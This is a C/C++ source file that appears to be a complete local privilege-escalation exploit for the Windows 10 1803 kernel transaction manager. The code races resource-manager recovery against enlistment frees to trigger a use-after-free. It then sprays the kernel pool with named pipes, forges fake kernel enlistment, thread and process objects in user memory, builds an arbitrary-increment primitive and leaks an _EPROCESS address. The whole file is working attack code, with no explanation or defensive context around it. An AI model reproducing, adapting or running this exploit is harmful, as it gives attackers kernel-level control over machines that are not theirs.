//target OS version: cn_windows_10_consumer_editions_version_1803_updated_march_2018_x64_dvd_12063766

#include <windows.h>
#include <ktmw32.h>
#include <stdio.h>
#include "obj.h"

#pragma comment(lib, "KtmW32.lib")

#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_SUCCESS 0x00000000

#define TRIGGER_ENLISTMENT_HANDLES 0x1000

#define NAMED_PIPE_COUNT1 8000
#define NAMED_PIPE_COUNT2 5000
#define KENLISTMENT_OBJ_SIZE 0x240
#define NAMED_PIPE_BUFFER_SIZE (KENLISTMENT_OBJ_SIZE - 0x48)

typedef struct _TRANSACTION_NOTIFICATION_ALL
{
	TRANSACTION_NOTIFICATION TransacNotification;
	TRANSACTION_NOTIFICATION_RECOVERY_ARGUMENT TransacNotificationRecoveryArg;
} TRANSACTION_NOTIFICATION_ALL, *PTRANSACTION_NOTIFICATION_ALL;

extern "C" NTSTATUS NTAPI NtQueryInformationResourceManager(HANDLE ResourceManagerHandle, RESOURCEMANAGER_INFORMATION_CLASS ResourceManagerInformationClass, PVOID ResourceManagerInformation, ULONG ResourceManagerInformationLength, PULONG ReturnLength);
extern "C" NTSTATUS NTAPI NtQueryInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength);

HANDLE hTM, hRM, hTx1;

HANDLE hRecovery, hReleaseRMMutex;
HANDLE hTriggerArray[TRIGGER_ENLISTMENT_HANDLES];

ULONG EnlistmentCount = 0;
BOOL blStartTrigger = FALSE;
BOOL blFinalizeTrigger = FALSE;

HANDLE hReadPipe1[NAMED_PIPE_COUNT1], hWritePipe1[NAMED_PIPE_COUNT1];
HANDLE hReadPipe2[NAMED_PIPE_COUNT2], hWritePipe2[NAMED_PIPE_COUNT2];

_KENLISTMENT_KERNEL_OBJ FakeEnlistment;
_KWAIT_BLOCK FakeWaitBlock;
_KWAIT_BLOCK FakeKProcessWaitBlock;
_KWAIT_BLOCK FakeKthreadWaitBlockList[2];
_KMUTANT FakeMutant;
_KTHREAD FakeKthread;
_KPROCESS FakeKprocess;
_KTRANSACTION FakeTransaction;

_KENLISTMENT_KERNEL_OBJ IncrementEnlistment;
_KWAIT_BLOCK IncrementWaitBlock;
_KWAIT_BLOCK IncrementKProcessWaitBlock;
_KWAIT_BLOCK IncrementKthreadWaitBlockList[2];
_KMUTANT IncrementMutant;
_KTHREAD IncrementKthread;
_KPROCESS IncrementKprocess;
_KTRANSACTION IncrementTransaction;

VOID ReleaseRMMutex()
{
	for (;;)
	{
		if (FakeEnlistment.KENLISTMENT.Flags == 0x01)
		{
			Sleep(1000);
			FakeEnlistment.KENLISTMENT.Flags = 0x81;
		}
	}
}

VOID CreateReleaseRMMutexThread()
{
	DWORD ThreadId;

	hReleaseRMMutex = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReleaseRMMutex, NULL, CREATE_SUSPENDED, &ThreadId);
	ResumeThread(hReleaseRMMutex);
}

VOID PoolFengShui()
{
	BYTE szTemp[NAMED_PIPE_BUFFER_SIZE];

	for (int i = 0; i < NAMED_PIPE_COUNT1; i++)
	{
		CreatePipe(&hReadPipe1[i], &hWritePipe1[i], NULL, sizeof(szTemp));
	}

	for (int i = 0; i < NAMED_PIPE_COUNT2; i++)
	{
		CreatePipe(&hReadPipe2[i], &hWritePipe2[i], NULL, sizeof(szTemp));
	}

	for (int i = 0; i < NAMED_PIPE_COUNT1 - NAMED_PIPE_COUNT2; i++)
	{
		WriteFile(hWritePipe1[i], szTemp, sizeof(szTemp), NULL, NULL);
	}

	for (int i = 0, j = NAMED_PIPE_COUNT1 - NAMED_PIPE_COUNT2; i < NAMED_PIPE_COUNT2; i++, j++)
	{
		WriteFile(hWritePipe1[j], szTemp, sizeof(szTemp), NULL, NULL);
		WriteFile(hWritePipe2[i], szTemp, sizeof(szTemp), NULL, NULL);
	}

	for (int i = 0; i < NAMED_PIPE_COUNT2; i++)
	{
		ReadFile(hReadPipe2[i], szTemp, sizeof(szTemp), NULL, NULL);
	}
}

VOID PoolFengShuiEnd()
{
	for (int i = 0; i < NAMED_PIPE_COUNT1; i++)
	{
		CloseHandle(hReadPipe1[i]);
		CloseHandle(hWritePipe1[i]);
		CloseHandle(hReadPipe2[i]);
		CloseHandle(hWritePipe2[i]);
	}
}

VOID CongestThread(VOID)
{
	RESOURCEMANAGER_BASIC_INFORMATION *pRMBasicInfo = NULL;
	pRMBasicInfo = (RESOURCEMANAGER_BASIC_INFORMATION *)new BYTE[sizeof(RESOURCEMANAGER_BASIC_INFORMATION) + 0x1000];

	for (; blStartTrigger;)
	{
		NtQueryInformationResourceManager(hRM, ResourceManagerBasicInformation, pRMBasicInfo, 0x40, NULL);
	}
}

ULONG GetNotificationCount()
{
	BOOL bRet;
	TRANSACTION_NOTIFICATION_ALL Notification;
	ULONG ulCount = 0;
	ULONG ulReturnLength = 0;

	for (;;)
	{
		bRet = GetNotificationResourceManager(hRM, (PTRANSACTION_NOTIFICATION)&Notification, sizeof(Notification), 10, &ulReturnLength);
		if (!bRet)
		{
			if (GetLastError() == WAIT_TIMEOUT)
			{
				break;
			}
			return 0;
		}

		ulCount++;
	}

	return ulCount;
}

VOID NotificationCountThread()
{
	for (; blStartTrigger;)
	{
		EnlistmentCount += GetNotificationCount();
	}
}

VOID SuspendRecoveryThread()
{
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
	SetThreadAffinityMask(GetCurrentThread(), 2);

	VOID *pThreadInformation = NULL;
	BYTE szTemp[NAMED_PIPE_BUFFER_SIZE];

	pThreadInformation = new BYTE[0x100];
	memset(szTemp, 0x41, sizeof(szTemp));
	*(PULONG64)(szTemp + 0xA8) = (ULONG64)(FakeEnlistment.KENLISTMENT.NextSameRm.Flink);

	for (; blStartTrigger;)
	{
		if (NtQueryInformationThread(hRecovery, ThreadLastSystemCall, pThreadInformation, 0x10, NULL) != STATUS_UNSUCCESSFUL)
		{
			if (!EnlistmentCount)
			{
				continue;
			}
			SuspendThread(hRecovery);
			EnlistmentCount += GetNotificationCount();
			int nFreeIndex = EnlistmentCount - 1 - TRIGGER_ENLISTMENT_HANDLES * 3;

			if (nFreeIndex > 0 && nFreeIndex < TRIGGER_ENLISTMENT_HANDLES)
			{
				//printf("release enlistment: %X\n", nFreeIndex);
				CommitComplete(hTriggerArray[nFreeIndex], 0);
				CloseHandle(hTriggerArray[nFreeIndex]);

				for (int i = 0; i < 100; i++)
				{
					WriteFile(hWritePipe2[i], szTemp, sizeof(szTemp), NULL, NULL);
				}
			}
			ResumeThread(hRecovery);
		}
	}
}

VOID SetFakeKernelObject()
{
	memset(&FakeEnlistment, 0x00, sizeof(FakeEnlistment));
	memset(&FakeWaitBlock, 0x00, sizeof(FakeWaitBlock));
	memset(&FakeKProcessWaitBlock, 0x00, sizeof(FakeKProcessWaitBlock));
	memset(&FakeMutant, 0x00, sizeof(FakeMutant));
	memset(&FakeKthread, 0x00, sizeof(FakeKthread));
	memset(&FakeKprocess, 0x00, sizeof(FakeKprocess));
	memset(FakeKthreadWaitBlockList, 0x00, sizeof(FakeKthreadWaitBlockList));
	memset(&FakeTransaction, 0x00, sizeof(FakeTransaction));

	memset(&IncrementEnlistment, 0x00, sizeof(IncrementEnlistment));
	memset(&IncrementWaitBlock, 0x00, sizeof(IncrementWaitBlock));
	memset(&IncrementKProcessWaitBlock, 0x00, sizeof(IncrementKProcessWaitBlock));
	memset(&IncrementMutant, 0x00, sizeof(IncrementMutant));
	memset(&IncrementKthread, 0x00, sizeof(IncrementKthread));
	memset(&IncrementKprocess, 0x00, sizeof(IncrementKprocess));
	memset(IncrementKthreadWaitBlockList, 0x00, sizeof(IncrementKthreadWaitBlockList));
	memset(&IncrementTransaction, 0x00, sizeof(IncrementTransaction));

	FakeEnlistment.Reverse1 = 0x10098;
	FakeEnlistment.Reverse2 = 0x10098;

	FakeEnlistment.KENLISTMENT.Mutex.Header.Type = 0x2;
	FakeEnlistment.KENLISTMENT.Mutex.Header.SignalState = 1;

	FakeWaitBlock.WaitListEntry.Flink = (_LIST_ENTRY *)&FakeEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink;
	FakeWaitBlock.WaitListEntry.Blink = (_LIST_ENTRY *)&FakeEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink;
	FakeEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink = (_LIST_ENTRY *)&FakeWaitBlock.WaitListEntry.Flink;
	FakeEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Blink = (_LIST_ENTRY *)&FakeWaitBlock.WaitListEntry.Flink;
	FakeEnlistment.KENLISTMENT.State = KEnlistmentCommitted;

	FakeEnlistment.KENLISTMENT.Flags = 0x81;
	FakeEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY *)&FakeEnlistment.KENLISTMENT.NextSameRm.Flink;
	FakeEnlistment.KENLISTMENT.Transaction = &FakeTransaction;
	FakeTransaction.State = KTransactionPrepared;

	FakeWaitBlock.WaitType = 0x3;
	FakeWaitBlock.Object = &FakeMutant;
	FakeMutant.Header.Type = 0x3;
	FakeWaitBlock.Thread = &FakeKthread;

	FakeKthread.State = 5;
	FakeKthread.WaitRegister.Flags = 1;
	FakeKthread.Queue = 0;

	FakeKthread.WaitBlockCount = 1;
	FakeKthread.WaitBlockList = FakeKthreadWaitBlockList;
	FakeKthread.ApcState.Process = &FakeKprocess;
	FakeKthreadWaitBlockList[0].BlockState = 6;

	FakeKprocess.StackCount.Value = 7;

	FakeKProcessWaitBlock.WaitListEntry.Flink = (_LIST_ENTRY *)&FakeKprocess.ReadyListHead.Flink;
	FakeKProcessWaitBlock.WaitListEntry.Blink = (_LIST_ENTRY *)&FakeKprocess.ReadyListHead.Flink;
	FakeKprocess.ReadyListHead.Flink = (_LIST_ENTRY *)&FakeKProcessWaitBlock.WaitListEntry.Flink;
	FakeKprocess.ReadyListHead.Blink = (_LIST_ENTRY *)&FakeKProcessWaitBlock.WaitListEntry.Flink;
}

VOID RecoveryThread()
{
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
	SetThreadAffinityMask(GetCurrentThread(), 2);

	GUID Guid;
	int attempt = 0;

	CoCreateGuid(&Guid);
	SetFakeKernelObject();

	for (;!blFinalizeTrigger;)
	{
		printf("%d attempt\n", ++attempt);

		PoolFengShui();

		hTM = CreateTransactionManager(NULL, NULL, TRANSACTION_MANAGER_VOLATILE, 0);
		hRM = CreateResourceManager(NULL, &Guid, RESOURCE_MANAGER_VOLATILE, hTM, NULL);

		HANDLE hTx = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);

		for (int i = 0; i < TRIGGER_ENLISTMENT_HANDLES; i++)
		{
			hTriggerArray[i] = CreateEnlistment(NULL, hRM, hTx, 0x39ffff0f, 0, NULL);
		}

		CommitTransactionAsync(hTx);

		for (int i = 0; i < TRIGGER_ENLISTMENT_HANDLES; i++)
		{
			PrePrepareComplete(hTriggerArray[i], NULL);
		}

		for (int i = 0; i < TRIGGER_ENLISTMENT_HANDLES; i++)
		{
			PrepareComplete(hTriggerArray[i], NULL);
		}

		blStartTrigger = TRUE;
		EnlistmentCount = 0;

		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)NotificationCountThread, NULL, NULL, NULL);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CongestThread, NULL, NULL, NULL);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SuspendRecoveryThread, NULL, NULL, NULL);
		RecoverResourceManager(hRM);

		for (int i = 0; i < TRIGGER_ENLISTMENT_HANDLES; i++)
		{
			CloseHandle(hTriggerArray[i]);
			hTriggerArray[i] = INVALID_HANDLE_VALUE;
		}

		blStartTrigger = FALSE;

		Sleep(500);

		CloseHandle(hRM);
		CloseHandle(hTM);

		PoolFengShuiEnd();
	}
}

VOID IncrementPrimitive(PVOID IncrementAddr, ULONG IncrementTimes)
{
	for (int i = 0; i < IncrementTimes; i++)
	{
		IncrementEnlistment.Reverse1 = 0x10098;
		IncrementEnlistment.Reverse2 = 0x10098;

		IncrementEnlistment.KENLISTMENT.Mutex.Header.Type = 0x2;
		IncrementEnlistment.KENLISTMENT.Mutex.Header.SignalState = 1;

		IncrementWaitBlock.WaitListEntry.Flink = (_LIST_ENTRY *)&IncrementEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink;
		IncrementWaitBlock.WaitListEntry.Blink = (_LIST_ENTRY *)&IncrementEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink;
		IncrementEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Flink = (_LIST_ENTRY *)&IncrementWaitBlock.WaitListEntry.Flink;
		IncrementEnlistment.KENLISTMENT.Mutex.Header.WaitListHead.Blink = (_LIST_ENTRY *)&IncrementWaitBlock.WaitListEntry.Flink;
		IncrementEnlistment.KENLISTMENT.State = KEnlistmentCommitted;

		IncrementEnlistment.KENLISTMENT.Flags = 0x81;
		IncrementEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY *)&FakeEnlistment.KENLISTMENT.NextSameRm.Flink;
		IncrementEnlistment.KENLISTMENT.Transaction = &IncrementTransaction;
		IncrementTransaction.State = KTransactionPrepared;

		IncrementWaitBlock.WaitType = 0x3;
		IncrementWaitBlock.Object = &IncrementMutant;
		IncrementMutant.Header.Type = 0x3;
		IncrementWaitBlock.Thread = &IncrementKthread;

		IncrementKthread.State = 5;
		IncrementKthread.WaitRegister.Flags = 1;
		IncrementKthread.Queue = (_DISPATCHER_HEADER *)((ULONG64)IncrementAddr - 0x28);

		IncrementKthread.WaitBlockCount = 1;
		IncrementKthread.WaitBlockList = IncrementKthreadWaitBlockList;
		IncrementKthread.ApcState.Process = &IncrementKprocess;
		IncrementKthreadWaitBlockList[0].BlockState = 6;

		IncrementKprocess.StackCount.Value = 7;

		IncrementKProcessWaitBlock.WaitListEntry.Flink = (_LIST_ENTRY *)&IncrementKprocess.ReadyListHead.Flink;
		IncrementKProcessWaitBlock.WaitListEntry.Blink = (_LIST_ENTRY *)&IncrementKprocess.ReadyListHead.Flink;
		IncrementKprocess.ReadyListHead.Flink = (_LIST_ENTRY *)&IncrementKProcessWaitBlock.WaitListEntry.Flink;
		IncrementKprocess.ReadyListHead.Blink = (_LIST_ENTRY *)&IncrementKProcessWaitBlock.WaitListEntry.Flink;

		IncrementEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY *)&FakeEnlistment.KENLISTMENT.NextSameRm.Flink;
		FakeEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY *)&IncrementEnlistment.KENLISTMENT.NextSameRm.Flink;

		for (;;)
		{
			if (IncrementEnlistment.KENLISTMENT.Flags == 0x01)
			{
				break;
			}
		}

		FakeEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY *)&FakeEnlistment.KENLISTMENT.NextSameRm.Flink;
		FakeEnlistment.KENLISTMENT.Flags = 0x81;
		for (;;)
		{
			Sleep(50);
			if (FakeEnlistment.KENLISTMENT.Flags == 0x01)
			{
				break;
			}
		}
	}
}

VOID ElevationPrivilege(VOID)
{
	_KRESOURCEMANAGER *pKResourceManager = NULL;
	RESOURCEMANAGER_BASIC_INFORMATION *pRMBasicInfo = NULL;
	BYTE *pReadData = NULL;
	_KMUTANT *pKmutant = NULL;
	_KTHREAD *pKthread = NULL;
	BYTE IncrementArray[8];
	ULONG64 IncrementAddr;

	for (;;)
	{
		if (FakeEnlistment.KENLISTMENT.Mutex.OwnerThread != 0 && FakeEnlistment.KENLISTMENT.Flags == 0x01)
		{
			blStartTrigger = FALSE;
			break;
		}
	}

	pKthread = CONTAINING_RECORD(FakeEnlistment.KENLISTMENT.Mutex.MutantListEntry.Flink, _KTHREAD, MutantListHead);
	*(ULONG64 *)IncrementArray = (ULONG64)(&pKthread->ApcState) + 0x20;
	printf("pKthread->ApcState Addr: %llX\n", *(ULONG64 *)IncrementArray);

	pKmutant = CONTAINING_RECORD(FakeEnlistment.KENLISTMENT.Mutex.MutantListEntry.Blink, _KMUTANT, MutantListEntry);
	pKResourceManager = CONTAINING_RECORD(pKmutant, _KRESOURCEMANAGER, Mutex);

	for (int i = 0; i < 8; i++)
	{
		IncrementAddr = (ULONG64)(&pKResourceManager->Description.Buffer) + i;
		IncrementPrimitive((PVOID)IncrementAddr, IncrementArray[i]);
	}

	IncrementAddr = (ULONG64)(&pKResourceManager->Description.Length);
	IncrementPrimitive((PVOID)IncrementAddr, 0x8);

	pRMBasicInfo = (RESOURCEMANAGER_BASIC_INFORMATION *)new BYTE[sizeof(RESOURCEMANAGER_BASIC_INFORMATION) + 0x1000];
	CreateReleaseRMMutexThread();
	NtQueryInformationResourceManager(hRM, ResourceManagerBasicInformation, pRMBasicInfo, 0x40, NULL);
	TerminateThread(hReleaseRMMutex, 0);

	pReadData = (BYTE *)pRMBasicInfo->Description;
	printf("_EPROCESS Addr: %llX\n", *(ULONG64 *)pReadData);

	FakeEnlistment.KENLISTMENT.NextSameRm.Flink = (_LIST_ENTRY*)&pKResourceManager->EnlistmentHead.Flink;
	blFinalizeTrigger = TRUE;
}

int main()
{
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ElevationPrivilege, NULL, NULL, NULL);

	hRecovery = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RecoveryThread, NULL, NULL, NULL);
	WaitForSingleObject(hRecovery, INFINITE);

	return 0;
}
